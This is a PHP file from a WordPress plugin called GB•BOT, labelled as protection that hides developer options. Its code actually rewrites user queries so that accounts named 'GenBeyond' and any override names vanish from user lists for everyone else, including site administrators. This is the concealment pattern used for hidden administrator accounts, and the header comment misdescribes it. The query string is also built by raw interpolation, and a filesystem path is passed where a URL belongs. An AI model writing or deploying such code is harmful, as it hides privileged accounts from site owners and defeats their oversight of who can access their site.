<?php
/**
 * GB•BOT - protection.php
 * 
 * This file is intended to hide some developer options from the eyes of the average user to prevent accidental damage to the website.
 */
function GBBOT_PROTECTION_INIT() {
	global $current_user, $GB_PROTECTION_OVERRIDE, $GBBOT_ALLOWED_USERS;
	$GBBOT_ALLOWED_USERS = ['GenBeyond','genbeyond'];
	if (isset($GB_PROTECTION_OVERRIDE) && is_array($GB_PROTECTION_OVERRIDE))
		$GBBOT_ALLOWED_USERS = array_merge($GBBOT_ALLOWED_USERS, $GB_PROTECTION_OVERRIDE);
	if (is_null($current_user) && function_exists('wp_get_current_user'))
		wp_get_current_user();
	if ( !in_array($current_user->user_login, $GBBOT_ALLOWED_USERS) ) {
		add_action('pre_user_query', function($user_search) {
			global $wpdb, $GBBOT_ALLOWED_USERS;
			$user_search->query_where = str_replace('WHERE 1=1',
					"WHERE 1=1 AND {$wpdb->users}.user_login NOT IN ('".implode("','",$GBBOT_ALLOWED_USERS)."')",$user_search->query_where);
		});
		add_action('admin_enqueue_scripts', function() {
			wp_enqueue_style('gb-protection-styles', WP_PLUGIN_DIR . '/gb-bot/assets/styles/protection.css');
		});
	}
}
add_action('init','GBBOT_PROTECTION_INIT');